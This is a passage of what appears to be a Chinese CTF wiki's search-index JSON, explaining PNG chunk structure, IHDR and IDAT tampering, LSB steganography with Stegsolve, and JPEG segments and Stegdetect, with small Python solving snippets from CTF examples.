\u6bd4\u7279\u7684\u4fe1\u606f\u3002\n\n\n\n\n\u5982\u679c\u662f\u8981\u5bfb\u627e\u8fd9\u79cd LSB \u9690\u85cf\u75d5\u8ff9\u7684\u8bdd\uff0c\u6709\u4e00\u4e2a\u5de5\u5177 \nStegsolve\n \u662f\u4e2a\u795e\u5668\uff0c\u53ef\u4ee5\u6765\u8f85\u52a9\u6211\u4eec\u8fdb\u884c\u5206\u6790\u3002\n\n\n\u901a\u8fc7\u4e0b\u65b9\u7684\u6309\u94ae\u53ef\u4ee5\u89c2\u5bdf\u6bcf\u4e2a\u901a\u9053\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u67e5\u770b R \u901a\u9053\u7684\u6700\u4f4e\u4f4d\u7b2c 8 \u4f4d\u5e73\u9762\u7684\u4fe1\u606f\u3002\n\n\n\n\nLSB \u7684\u4fe1\u606f\u501f\u52a9\u4e8e Stegsolve \u67e5\u770b\u5404\u4e2a\u901a\u9053\u65f6\u4e00\u5b9a\u8981\u7ec6\u5fc3\u6355\u6349\u5f02\u5e38\u70b9\uff0c\u6293\u4f4f LSB \u9690\u5199\u7684\u86db\u4e1d\u9a6c\u8ff9\u3002\n\n\n\u4f8b\u9898\n\n\n\n\nHCTF - 2016 - Misc\n\n\n\n\n\u8fd9\u9898\u7684\u4fe1\u606f\u9690\u85cf\u5728 RGB \u4e09\u4e2a\u901a\u9053\u7684\u6700\u4f4e\u4f4d\u4e2d\uff0c\u501f\u52a9 \nStegsolve--\nAnalyse--\nData Extract\n \u53ef\u4ee5\u6307\u5b9a\u901a\u9053\u8fdb\u884c\u63d0\u53d6\u3002\n\n\n\n\n\u53ef\u4ee5\u53d1\u73b0 \nzip\n \u5934\uff0c\u7528 \nsave bin\n \u4fdd\u5b58\u4e3a\u538b\u7f29\u5305\u540e\uff0c\u6253\u5f00\u8fd0\u884c\u5176\u4e2d\u7684 ELF \u6587\u4ef6\u5c31\u53ef\u4ee5\u5f97\u5230\u6700\u540e\u7684 flag\u3002\n\n\n\n\n\u66f4\u591a\u5173\u4e8e LSB \u7684\u7814\u7a76\u53ef\u4ee5\u770b \n\u8fd9\u91cc\n\u3002\n\n\n\n\n\u9690\u5199\u8f6f\u4ef6\n\n\nStepic", 
            "title": "PNG"
        }, 
        {
            "location": "/misc/picture/png/#_1", 
            "text": "\u5bf9\u4e8e\u4e00\u4e2a PNG \u6587\u4ef6\u6765\u8bf4\uff0c\u5176\u6587\u4ef6\u5934\u603b\u662f\u7531\u4f4d\u56fa\u5b9a\u7684\u5b57\u8282\u6765\u63cf\u8ff0\u7684\uff0c\u5269\u4f59\u7684\u90e8\u5206\u7531 3 \u4e2a\u4ee5\u4e0a\u7684 PNG \u7684\u6570\u636e\u5757\uff08Chunk\uff09\u6309\u7167\u7279\u5b9a\u7684\u987a\u5e8f\u7ec4\u6210\u3002  \u6587\u4ef6\u5934  89 50 4E 47 0D 0A 1A 0A  + \u6570\u636e\u5757 + \u6570\u636e\u5757 + \u6570\u636e\u5757\u2026\u2026", 
            "title": "\u6587\u4ef6\u683c\u5f0f"
        }, 
        {
            "location": "/misc/picture/png/#chunk", 
            "text": "PNG \u5b9a\u4e49\u4e86\u4e24\u79cd\u7c7b\u578b\u7684\u6570\u636e\u5757\uff0c\u4e00\u79cd\u662f\u79f0\u4e3a\u5173\u952e\u6570\u636e\u5757\uff08critical chunk\uff09\uff0c\u8fd9\u662f\u6807\u51c6\u7684\u6570\u636e\u5757\uff0c\u53e6\u4e00\u79cd\u53eb\u505a\u8f85\u52a9\u6570\u636e\u5757\uff08ancillary chunks\uff09\uff0c\u8fd9\u662f\u53ef\u9009\u7684\u6570\u636e\u5757\u3002\u5173\u952e\u6570\u636e\u5757\u5b9a\u4e49\u4e86 4 \u4e2a\u6807\u51c6\u6570\u636e\u5757\uff0c\u6bcf\u4e2a PNG \u6587\u4ef6\u90fd\u5fc5\u987b\u5305\u542b\u5b83\u4eec\uff0cPNG \u8bfb\u5199\u8f6f\u4ef6\u4e5f\u90fd\u5fc5\u987b\u8981\u652f\u6301\u8fd9\u4e9b\u6570\u636e\u5757\u3002     \u6570\u636e\u5757\u7b26\u53f7  \u6570\u636e\u5757\u540d\u79f0  \u591a\u6570\u636e\u5757  \u53ef\u9009\u5426  \u4f4d\u7f6e\u9650\u5236      IHDR  \u6587\u4ef6\u5934\u6570\u636e\u5757  \u5426  \u5426  \u7b2c\u4e00\u5757    cHRM  \u57fa\u8272\u548c\u767d\u8272\u70b9\u6570\u636e\u5757  \u5426  \u662f  \u5728PLTE\u548cIDAT\u4e4b\u524d    gAMA  \u56fe\u50cf\u03b3\u6570\u636e\u5757  \u5426  \u662f  \u5728PLTE\u548cIDAT\u4e4b\u524d    sBIT  \u6837\u672c\u6709\u6548\u4f4d\u6570\u636e\u5757  \u5426  \u662f  \u5728PLTE\u548cIDAT\u4e4b\u524d    PLTE  \u8c03\u8272\u677f\u6570\u636e\u5757  \u5426  \u662f  \u5728IDAT\u4e4b\u524d    bKGD  \u80cc\u666f\u989c\u8272\u6570\u636e\u5757  \u5426  \u662f  \u5728PLTE\u4e4b\u540eIDAT\u4e4b\u524d    hIST  \u56fe\u50cf\u76f4\u65b9\u56fe\u6570\u636e\u5757  \u5426  \u662f  \u5728PLTE\u4e4b\u540eIDAT\u4e4b\u524d    tRNS  \u56fe\u50cf\u900f\u660e\u6570\u636e\u5757  \u5426  \u662f  \u5728PLTE\u4e4b\u540eIDAT\u4e4b\u524d    oFFs  (\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09  \u5426  \u662f  \u5728IDAT\u4e4b\u524d    pHYs  \u7269\u7406\u50cf\u7d20\u5c3a\u5bf8\u6570\u636e\u5757  \u5426  \u662f  \u5728IDAT\u4e4b\u524d    sCAL  (\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09  \u5426  \u662f  \u5728IDAT\u4e4b\u524d    IDAT  \u56fe\u50cf\u6570\u636e\u5757  \u662f  \u5426  \u4e0e\u5176\u4ed6IDAT\u8fde\u7eed    tIME  \u56fe\u50cf\u6700\u540e\u4fee\u6539\u65f6\u95f4\u6570\u636e\u5757  \u5426  \u662f  \u65e0\u9650\u5236    tEXt  \u6587\u672c\u4fe1\u606f\u6570\u636e\u5757  \u662f  \u662f  \u65e0\u9650\u5236    zTXt  \u538b\u7f29\u6587\u672c\u6570\u636e\u5757  \u662f  \u662f  \u65e0\u9650\u5236    fRAc  (\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09  \u662f  \u662f  \u65e0\u9650\u5236    gIFg  (\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09  \u662f  \u662f  \u65e0\u9650\u5236    gIFt  (\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09  \u662f  \u662f  \u65e0\u9650\u5236    gIFx  (\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09  \u662f  \u662f  \u65e0\u9650\u5236    IEND  \u56fe\u50cf\u7ed3\u675f\u6570\u636e  \u5426  \u5426  \u6700\u540e\u4e00\u4e2a\u6570\u636e\u5757     \u5bf9\u4e8e\u6bcf\u4e2a\u6570\u636e\u5757\u90fd\u6709\u7740\u7edf\u4e00\u7684\u6570\u636e\u7ed3\u6784\uff0c\u6bcf\u4e2a\u6570\u636e\u5757\u7531 4 \u4e2a\u90e8\u5206\u7ec4\u6210     \u540d\u79f0  \u5b57\u8282\u6570  \u8bf4\u660e      Length\uff08\u957f\u5ea6\uff09  4\u5b57\u8282  \u6307\u5b9a\u6570\u636e\u5757\u4e2d\u6570\u636e\u57df\u7684\u957f\u5ea6\uff0c\u5176\u957f\u5ea6\u4e0d\u8d85\u8fc7\uff08231\uff0d1\uff09\u5b57\u8282    Chunk Type Code\uff08\u6570\u636e\u5757\u7c7b\u578b\u7801\uff09  4\u5b57\u8282  \u6570\u636e\u5757\u7c7b\u578b\u7801\u7531 ASCII \u5b57\u6bcd\uff08A - Z \u548c a - z\uff09\u7ec4\u6210    Chunk Data\uff08\u6570\u636e\u5757\u6570\u636e\uff09  \u53ef\u53d8\u957f\u5ea6  \u5b58\u50a8\u6309\u7167 Chunk Type Code \u6307\u5b9a\u7684\u6570\u636e    CRC\uff08\u5faa\u73af\u5197\u4f59\u68c0\u6d4b\uff09  4\u5b57\u8282  \u5b58\u50a8\u7528\u6765\u68c0\u6d4b\u662f\u5426\u6709\u9519\u8bef\u7684\u5faa\u73af\u5197\u4f59\u7801     CRC\uff08Cyclic Redundancy Check\uff09\u57df\u4e2d\u7684\u503c\u662f\u5bf9 Chunk Type Code \u57df\u548c Chunk Data \u57df\u4e2d\u7684\u6570\u636e\u8fdb\u884c\u8ba1\u7b97\u5f97\u5230\u7684\u3002", 
            "title": "\u6570\u636e\u5757CHUNk"
        }, 
        {
            "location": "/misc/picture/png/#ihdr", 
            "text": "\u6587\u4ef6\u5934\u6570\u636e\u5757 IHDR\uff08Header Chunk\uff09\uff1a\u5b83\u5305\u542b\u6709 PNG \u6587\u4ef6\u4e2d\u5b58\u50a8\u7684\u56fe\u50cf\u6570\u636e\u7684\u57fa\u672c\u4fe1\u606f\uff0c\u7531 13 \u5b57\u8282\u7ec4\u6210\uff0c\u5e76\u8981\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u6570\u636e\u5757\u51fa\u73b0\u5728 PNG \u6570\u636e\u6d41\u4e2d\uff0c\u800c\u4e14\u4e00\u4e2a PNG \u6570\u636e\u6d41\u4e2d\u53ea\u80fd\u6709\u4e00\u4e2a\u6587\u4ef6\u5934\u6570\u636e\u5757  \u5176\u4e2d\u6211\u4eec\u5173\u6ce8\u7684\u662f\u524d8\u5b57\u8282\u7684\u5185\u5bb9     \u57df\u7684\u540d\u79f0  \u5b57\u8282\u6570  \u8bf4\u660e      Width  4 bytes  \u56fe\u50cf\u5bbd\u5ea6\uff0c\u4ee5\u50cf\u7d20\u4e3a\u5355\u4f4d    Height  4 bytes  \u56fe\u50cf\u9ad8\u5ea6\uff0c\u4ee5\u50cf\u7d20\u4e3a\u5355\u4f4d     \u6211\u4eec\u7ecf\u5e38\u4f1a\u53bb\u66f4\u6539\u4e00\u5f20\u56fe\u7247\u7684\u9ad8\u5ea6\u6216\u8005\u5bbd\u5ea6\u4f7f\u5f97\u4e00\u5f20\u56fe\u7247\u663e\u793a\u4e0d\u5b8c\u6574\u4ece\u800c\u8fbe\u5230\u9690\u85cf\u4fe1\u606f\u7684\u76ee\u7684\u3002   \u8fd9\u91cc\u53ef\u4ee5\u53d1\u73b0\u5728 Kali \u4e2d\u662f\u6253\u4e0d\u5f00\u8fd9\u5f20\u56fe\u7247\u7684\uff0c\u63d0\u793a  IHDR CRC error \uff0c\u800c Windows 10 \u81ea\u5e26\u7684\u56fe\u7247\u67e5\u770b\u5668\u80fd\u591f\u6253\u5f00\uff0c\u5c31\u63d0\u9192\u4e86\u6211\u4eec IHDR \u5757\u88ab\u4eba\u4e3a\u7684\u7be1\u6539\u8fc7\u4e86\uff0c\u4ece\u800c\u5c1d\u8bd5\u4fee\u6539\u56fe\u7247\u7684\u9ad8\u5ea6\u6216\u8005\u5bbd\u5ea6\u53d1\u73b0\u9690\u85cf\u7684\u5b57\u7b26\u4e32\u3002", 
            "title": "IHDR"
        }, 
        {
            "location": "/misc/picture/png/#_2", 
            "text": "", 
            "title": "\u4f8b\u9898"
        }, 
        {
            "location": "/misc/picture/png/#wdctf-finals-2017", 
            "text": "\u89c2\u5bdf\u6587\u4ef6\u53ef\u4ee5\u53d1\u73b0,\u6587\u4ef6\u5934\u53ca\u5bbd\u5ea6\u5f02\u5e38  00000000  80 59 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.YNG........IHDR|\n00000010  00 00 00 00 00 00 02 f8  08 06 00 00 00 93 2f 8a  |............../.|\n00000020  6b 00 00 00 04 67 41 4d  41 00 00 9c 40 20 0d e4  |k....gAMA...@ ..|\n00000030  cb 00 00 00 20 63 48 52  4d 00 00 87 0f 00 00 8c  |.... cHRM.......|\n00000040  0f 00 00 fd 52 00 00 81  40 00 00 7d 79 00 00 e9  |....R...@..}y...|\n...  \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6587\u4ef6\u5bbd\u5ea6\u4e0d\u80fd\u4efb\u610f\u4fee\u6539\uff0c\u9700\u8981\u6839\u636e IHDR \u5757\u7684 CRC \u503c\u7206\u7834\u5f97\u5230\u5bbd\u5ea6,\u5426\u5219\u56fe\u7247\u663e\u793a\u9519\u8bef\u4e0d\u80fd\u5f97\u5230 flag\u3002  import   os  import   binascii  import   struct  misc   =   open ( misc4.png , rb ) . read ()  for   i   in   range ( 1024 ): \n     data   =   misc [ 12 : 16 ]   +   struct . pack ( i , i ) +   misc [ 20 : 29 ] \n     crc32   =   binascii . crc32 ( data )     0xffffffff \n     if   crc32   ==   0x932f8a6b : \n         print   i   \u5f97\u5230\u5bbd\u5ea6\u503c\u4e3a 709 \u540e\uff0c\u6062\u590d\u56fe\u7247\u5f97\u5230 flag\u3002", 
            "title": "WDCTF-finals-2017"
        }, 
        {
            "location": "/misc/picture/png/#plte", 
            "text": "\u8c03\u8272\u677f\u6570\u636e\u5757 PLTE\uff08palette chunk\uff09\uff1a\u5b83\u5305\u542b\u6709\u4e0e\u7d22\u5f15\u5f69\u8272\u56fe\u50cf\uff08indexed-color image\uff09\u76f8\u5173\u7684\u5f69\u8272\u53d8\u6362\u6570\u636e\uff0c\u5b83\u4ec5\u4e0e\u7d22\u5f15\u5f69\u8272\u56fe\u50cf\u6709\u5173\uff0c\u800c\u4e14\u8981\u653e\u5728\u56fe\u50cf\u6570\u636e\u5757\uff08image data\nchunk\uff09\u4e4b\u524d\u3002\u771f\u5f69\u8272\u7684 PNG \u6570\u636e\u6d41\u4e5f\u53ef\u4ee5\u6709\u8c03\u8272\u677f\u6570\u636e\u5757\uff0c\u76ee\u7684\u662f\u4fbf\u4e8e\u975e\u771f\u5f69\u8272\u663e\u793a\u7a0b\u5e8f\u7528\u5b83\u6765\u91cf\u5316\u56fe\u50cf\u6570\u636e\uff0c\u4ece\u800c\u663e\u793a\u8be5\u56fe\u50cf\u3002", 
            "title": "PLTE"
        }, 
        {
            "location": "/misc/picture/png/#idat", 
            "text": "\u56fe\u50cf\u6570\u636e\u5757 IDAT\uff08image data chunk\uff09\uff1a\u5b83\u5b58\u50a8\u5b9e\u9645\u7684\u6570\u636e\uff0c\u5728\u6570\u636e\u6d41\u4e2d\u53ef\u5305\u542b\u591a\u4e2a\u8fde\u7eed\u987a\u5e8f\u7684\u56fe\u50cf\u6570\u636e\u5757\u3002   \u50a8\u5b58\u56fe\u50cf\u50cf\u6570\u6570\u636e  \u5728\u6570\u636e\u6d41\u4e2d\u53ef\u5305\u542b\u591a\u4e2a\u8fde\u7eed\u987a\u5e8f\u7684\u56fe\u50cf\u6570\u636e\u5757  \u91c7\u7528 LZ77 \u7b97\u6cd5\u7684\u6d3e\u751f\u7b97\u6cd5\u8fdb\u884c\u538b\u7f29  \u53ef\u4ee5\u7528 zlib \u89e3\u538b\u7f29   \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0cIDAT \u5757\u53ea\u6709\u5f53\u4e0a\u4e00\u4e2a\u5757\u5145\u6ee1\u65f6\uff0c\u624d\u4f1a\u7ee7\u7eed\u4e00\u4e2a\u65b0\u7684\u5757\u3002  \u7528  pngcheck  \u53bb\u67e5\u770b\u6b64 PNG \u6587\u4ef6  \u03bb . \\p ngcheck.exe -v sctf.png\nFile: sctf.png  ( 1421461  bytes ) \n  chunk IHDR at offset 0x0000c, length  13 \n     1000  x  562  image,  32 -bit RGB+alpha, non-interlaced\n  chunk sRGB at offset 0x00025, length  1 \n    rendering  intent   =  perceptual\n  chunk gAMA at offset 0x00032, length  4 :  0 .45455\n  chunk pHYs at offset 0x00042, length  9 : 3780x3780 pixels/meter  ( 96  dpi ) \n  chunk IDAT at offset 0x00057, length  65445 \n    zlib: deflated, 32K window, fast compression\n  chunk IDAT at offset 0x10008, length  65524 \n...\n  chunk IDAT at offset 0x150008, length  45027 \n  chunk IDAT at offset 0x15aff7, length  138 \n  chunk IEND at offset 0x15b08d, length  0 \nNo errors detected in sctf.png  ( 28  chunks,  36 .8% compression ) .  \u53ef\u4ee5\u770b\u5230\uff0c\u6b63\u5e38\u7684\u5757\u7684 length \u662f\u5728 65524 \u7684\u65f6\u5019\u5c31\u6ee1\u4e86\uff0c\u800c\u5012\u6570\u7b2c\u4e8c\u4e2a IDAT \u5757\u957f\u5ea6\u662f 45027\uff0c\u6700\u540e\u4e00\u4e2a\u957f\u5ea6\u662f 138\uff0c\u5f88\u660e\u663e\u6700\u540e\u4e00\u4e2a IDAT \u5757\u662f\u6709\u95ee\u9898\u7684\uff0c\u56e0\u4e3a\u4ed6\u672c\u6765\u5e94\u8be5\u5e76\u5165\u5230\u5012\u6570\u7b2c\u4e8c\u4e2a\u672a\u6ee1\u7684\u5757\u91cc.  \u5229\u7528  python zlib  \u89e3\u538b\u591a\u4f59 IDAT \u5757\u7684\u5185\u5bb9\uff0c\u6b64\u65f6\u6ce8\u610f\u5254\u9664  \u957f\u5ea6\u3001\u6570\u636e\u5757\u7c7b\u578b\u53ca\u672b\u5c3e\u7684CRC\u6821\u9a8c\u503c \u3002  import   zlib  import   binascii  IDAT   =   789...667 . decode ( hex )  result   =   binascii . hexlify ( zlib . decompress ( IDAT ))  print   result", 
            "title": "IDAT"
        }, 
        {
            "location": "/misc/picture/png/#iend", 
            "text": "\u56fe\u50cf\u7ed3\u675f\u6570\u636e IEND\uff08image trailer chunk\uff09\uff1a\u5b83\u7528\u6765\u6807\u8bb0 PNG \u6587\u4ef6\u6216\u8005\u6570\u636e\u6d41\u5df2\u7ecf\u7ed3\u675f\uff0c\u5e76\u4e14\u5fc5\u987b\u8981\u653e\u5728\u6587\u4ef6\u7684\u5c3e\u90e8\u3002  00 00 00 00 49 45 4E 44 AE 42 60 82  IEND \u6570\u636e\u5757\u7684\u957f\u5ea6\u603b\u662f  00 00 00 00 \uff0c\u6570\u636e\u6807\u8bc6\u603b\u662f IEND  49 45 4E 44 \uff0c\u56e0\u6b64\uff0cCRC \u7801\u4e5f\u603b\u662f  AE 42 60 82 \u3002", 
            "title": "IEND"
        }, 
        {
            "location": "/misc/picture/png/#_3", 
            "text": "\u80cc\u666f\u989c\u8272\u6570\u636e\u5757 bKGD\uff08background color\uff09  \u57fa\u8272\u548c\u767d\u8272\u5ea6\u6570\u636e\u5757 cHRM\uff08primary chromaticities and white point\uff09\uff0c\u6240\u8c13\u767d\u8272\u5ea6\u662f\u6307\u5f53  R\uff1dG\uff1dB\uff1d\u6700\u5927\u503c  \u65f6\u5728\u663e\u793a\u5668\u4e0a\u4ea7\u751f\u7684\u767d\u8272\u5ea6  \u56fe\u50cf \u03b3 \u6570\u636e\u5757 gAMA\uff08image gamma\uff09  \u56fe\u50cf\u76f4\u65b9\u56fe\u6570\u636e\u5757 hIST\uff08image histogram\uff09  \u7269\u7406\u50cf\u7d20\u5c3a\u5bf8\u6570\u636e\u5757 pHYs\uff08physical pixel dimensions\uff09  \u6837\u672c\u6709\u6548\u4f4d\u6570\u636e\u5757 sBIT\uff08significant bits\uff09  \u6587\u672c\u4fe1\u606f\u6570\u636e\u5757 tEXt\uff08textual data\uff09  \u56fe\u50cf\u6700\u540e\u4fee\u6539\u65f6\u95f4\u6570\u636e\u5757 tIME \uff08image last-modification time\uff09  \u56fe\u50cf\u900f\u660e\u6570\u636e\u5757 tRNS \uff08transparency\uff09  \u538b\u7f29\u6587\u672c\u6570\u636e\u5757 zTXt \uff08compressed textual data\uff09", 
            "title": "\u5176\u4f59\u8f85\u52a9\u6570\u636e\u5757"
        }, 
        {
            "location": "/misc/picture/png/#lsb", 
            "text": "LSB \u5168\u79f0 Least Significant Bit\uff0c\u6700\u4f4e\u6709\u6548\u4f4d\u3002PNG \u6587\u4ef6\u4e2d\u7684\u56fe\u50cf\u50cf\u6570\u4e00\u822c\u662f\u7531 RGB \u4e09\u539f\u8272\uff08\u7ea2\u7eff\u84dd\uff09\u7ec4\u6210\uff0c\u6bcf\u4e00\u79cd\u989c\u8272\u5360\u7528 8 \u4f4d\uff0c\u53d6\u503c\u8303\u56f4\u4e3a  0x00  \u81f3  0xFF \uff0c\u5373\u6709 256 \u79cd\u989c\u8272\uff0c\u4e00\u5171\u5305\u542b\u4e86 256 \u7684 3 \u6b21\u65b9\u7684\u989c\u8272\uff0c\u5373 16777216 \u79cd\u989c\u8272\u3002  \u800c\u4eba\u7c7b\u7684\u773c\u775b\u53ef\u4ee5\u533a\u5206\u7ea61000\u4e07\u79cd\u4e0d\u540c\u7684\u989c\u8272\uff0c\u610f\u5473\u7740\u4eba\u7c7b\u7684\u773c\u775b\u65e0\u6cd5\u533a\u5206\u4f59\u4e0b\u7684\u989c\u8272\u5927\u7ea6\u67096777216\u79cd\u3002  LSB \u9690\u5199\u5c31\u662f\u4fee\u6539 RGB \u989c\u8272\u5206\u91cf\u7684\u6700\u4f4e\u4e8c\u8fdb\u5236\u4f4d\uff08LSB\uff09\uff0c\u6bcf\u4e2a\u989c\u8272\u4f1a\u6709 8 bit\uff0cLSB \u9690\u5199\u5c31\u662f\u4fee\u6539\u4e86\u50cf\u6570\u4e2d\u7684\u6700\u4f4e\u7684 1 bit\uff0c\u800c\u4eba\u7c7b\u7684\u773c\u775b\u4e0d\u4f1a\u6ce8\u610f\u5230\u8fd9\u524d\u540e\u7684\u53d8\u5316\uff0c\u6bcf\u4e2a\u50cf\u7d20\u53ef\u4ee5\u643a\u5e26 3 \u6bd4\u7279\u7684\u4fe1\u606f\u3002   \u5982\u679c\u662f\u8981\u5bfb\u627e\u8fd9\u79cd LSB \u9690\u85cf\u75d5\u8ff9\u7684\u8bdd\uff0c\u6709\u4e00\u4e2a\u5de5\u5177  Stegsolve  \u662f\u4e2a\u795e\u5668\uff0c\u53ef\u4ee5\u6765\u8f85\u52a9\u6211\u4eec\u8fdb\u884c\u5206\u6790\u3002  \u901a\u8fc7\u4e0b\u65b9\u7684\u6309\u94ae\u53ef\u4ee5\u89c2\u5bdf\u6bcf\u4e2a\u901a\u9053\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u67e5\u770b R \u901a\u9053\u7684\u6700\u4f4e\u4f4d\u7b2c 8 \u4f4d\u5e73\u9762\u7684\u4fe1\u606f\u3002   LSB \u7684\u4fe1\u606f\u501f\u52a9\u4e8e Stegsolve \u67e5\u770b\u5404\u4e2a\u901a\u9053\u65f6\u4e00\u5b9a\u8981\u7ec6\u5fc3\u6355\u6349\u5f02\u5e38\u70b9\uff0c\u6293\u4f4f LSB \u9690\u5199\u7684\u86db\u4e1d\u9a6c\u8ff9\u3002", 
            "title": "LSB"
        }, 
        {
            "location": "/misc/picture/png/#_4", 
            "text": "HCTF - 2016 - Misc   \u8fd9\u9898\u7684\u4fe1\u606f\u9690\u85cf\u5728 RGB \u4e09\u4e2a\u901a\u9053\u7684\u6700\u4f4e\u4f4d\u4e2d\uff0c\u501f\u52a9  Stegsolve-- Analyse-- Data Extract  \u53ef\u4ee5\u6307\u5b9a\u901a\u9053\u8fdb\u884c\u63d0\u53d6\u3002   \u53ef\u4ee5\u53d1\u73b0  zip  \u5934\uff0c\u7528  save bin  \u4fdd\u5b58\u4e3a\u538b\u7f29\u5305\u540e\uff0c\u6253\u5f00\u8fd0\u884c\u5176\u4e2d\u7684 ELF \u6587\u4ef6\u5c31\u53ef\u4ee5\u5f97\u5230\u6700\u540e\u7684 flag\u3002   \u66f4\u591a\u5173\u4e8e LSB \u7684\u7814\u7a76\u53ef\u4ee5\u770b  \u8fd9\u91cc \u3002", 
            "title": "\u4f8b\u9898"
        }, 
        {
            "location": "/misc/picture/png/#_5", 
            "text": "Stepic", 
            "title": "\u9690\u5199\u8f6f\u4ef6"
        }, 
        {
            "location": "/misc/picture/jpg/", 
            "text": "\u6587\u4ef6\u7ed3\u6784\n\n\n\n\nJPEG \u662f\u6709\u635f\u538b\u7f29\u683c\u5f0f\uff0c\u5c06\u50cf\u7d20\u4fe1\u606f\u7528 JPEG \u4fdd\u5b58\u6210\u6587\u4ef6\u518d\u8bfb\u53d6\u51fa\u6765\uff0c\u5176\u4e2d\u67d0\u4e9b\u50cf\u7d20\u503c\u4f1a\u6709\u5c11\u8bb8\u53d8\u5316\u3002\u5728\u4fdd\u5b58\u65f6\u6709\u4e2a\u8d28\u91cf\u53c2\u6570\u53ef\u5728 0 \u81f3 100 \u4e4b\u95f4\u9009\u62e9\uff0c\u53c2\u6570\u8d8a\u5927\u56fe\u7247\u5c31\u8d8a\u4fdd\u771f\uff0c\u4f46\u56fe\u7247\u7684\u4f53\u79ef\u4e5f\u5c31\u8d8a\u5927\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\u9009\u62e9 70 \u6216 80 \u5c31\u8db3\u591f\u4e86\n\n\nJPEG \u6ca1\u6709\u900f\u660e\u5ea6\u4fe1\u606f\n\n\n\n\nJPG \u57fa\u672c\u6570\u636e\u7ed3\u6784\u4e3a\u4e24\u5927\u7c7b\u578b\uff1a\u300c\u6bb5\u300d\u548c\u7ecf\u8fc7\u538b\u7f29\u7f16\u7801\u7684\u56fe\u50cf\u6570\u636e\u3002\n\n\n\n\n\n\n\n\n\u540d \u79f0\n\n\n\u5b57\u8282\u6570\n\n\n\u6570\u636e\n\n\n\u8bf4\u660e\n\n\n\n\n\n\n\n\n\n\n\u6bb5 \u6807\u8bc6\n\n\n1\n\n\nFF\n\n\n\u6bcf\u4e2a\u65b0\u6bb5\u7684\u5f00\u59cb\u6807\u8bc6\n\n\n\n\n\n\n\u6bb5\u7c7b\u578b\n\n\n1\n\n\n\n\n\u7c7b\u578b\u7f16\u7801\uff08\u79f0\u4f5c\u6807\u8bb0\u7801\uff09\n\n\n\n\n\n\n\u6bb5\u957f \u5ea6\n\n\n2\n\n\n\n\n\u5305\u62ec\u6bb5\u5185\u5bb9\u548c\u6bb5\u957f\u5ea6\u672c\u8eab,\u4e0d\u5305\u62ec\u6bb5\u6807\u8bc6\u548c\u6bb5\u7c7b\u578b\n\n\n\n\n\n\n\u6bb5\u5185\u5bb9\n\n\n2\n\n\n\n\n\u226465533\u5b57\u8282\n\n\n\n\n\n\n\n\n\n\n\u6709\u4e9b\u6bb5\u6ca1\u6709\u957f\u5ea6\u63cf\u8ff0\u4e5f\u6ca1\u6709\u5185\u5bb9\uff0c\u53ea\u6709\u6bb5\u6807\u8bc6\u548c\u6bb5\u7c7b\u578b\u3002\u6587\u4ef6\u5934\u548c\u6587\u4ef6\u5c3e\u5747\u5c5e\u4e8e\u8fd9\u79cd\u6bb5\u3002\n\n\n\u6bb5\u4e0e\u6bb5\u4e4b\u95f4\u65e0\u8bba\u6709\u591a\u5c11 \nFF\n \u90fd\u662f\u5408\u6cd5\u7684\uff0c\u8fd9\u4e9b \nFF\n \u79f0\u4e3a\u300c\u586b\u5145\u5b57\u8282\u300d\uff0c\u5fc5\u987b\u88ab\u5ffd\u7565\u6389\u3002\n\n\n\n\n\u4e00\u4e9b\u5e38\u89c1\u7684\u6bb5\u7c7b\u578b\n\n\n\n\n0xffd8\n \u548c \n0xffd9\n\u4e3a JPG \u6587\u4ef6\u7684\u5f00\u59cb\u7ed3\u675f\u7684\u6807\u5fd7\u3002\n\n\n\u9690\u5199\u8f6f\u4ef6\n\n\nStegdetect\n\n\n\u901a\u8fc7\u7edf\u8ba1\u5206\u6790\u6280\u672f\u8bc4\u4f30 JPEG \u6587\u4ef6\u7684 DCT \u9891\u7387\u7cfb\u6570\u7684\u9690\u5199\u5de5\u5177, \u53ef\u4ee5\u68c0\u6d4b\u5230\u901a\u8fc7 JSteg\u3001JPHide\u3001OutGuess\u3001Invisible\nSecrets\u3001F5\u3001appendX \u548c Camouflage \u7b49\u8fd9\u4e9b\u9690\u5199\u5de5\u5177\u9690\u85cf\u7684\u4fe1\u606f\uff0c\u5e76\u4e14\u8fd8\u5177\u6709\u57fa\u4e8e\u5b57\u5178\u66b4\u529b\u7834\u89e3\u5bc6\u7801\u65b9\u6cd5\u63d0\u53d6\u901a\u8fc7 Jphide\u3001outguess \u548c jsteg-shell \u65b9\u5f0f\u5d4c\u5165\u7684\u9690\u85cf\u4fe1\u606f\u3002\n\n\n-q \u4ec5\u663e\u793a\u53ef\u80fd\u5305\u542b\u9690\u85cf\u5185\u5bb9\u7684\u56fe\u50cf\u3002\n-n \u542f\u7528\u68c0\u67e5JPEG\u6587\u4ef6\u5934\u529f\u80fd\uff0c\u4ee5\u964d\u4f4e\u8bef\u62a5\u7387\u3002\u5982\u679c\u542f\u7528\uff0c\u6240\u6709\u5e26\u6709\u6279\u6ce8\u533a\u57df\u7684\u6587\u4ef6\u5c06\u88ab\u89c6\u4e3a\u6ca1\u6709\u88ab\u5d4c\u5165\u4fe1\u606f\u3002\u5982\u679cJPEG\u6587\u4ef6\u7684JFIF\u6807\u8bc6\u7b26\u4e2d\u7684\u7248\u672c\u53f7\u4e0d\u662f1.1\uff0c\u5219\u7981\u7528OutGuess\u68c0\u6d4b\u3002\n-s 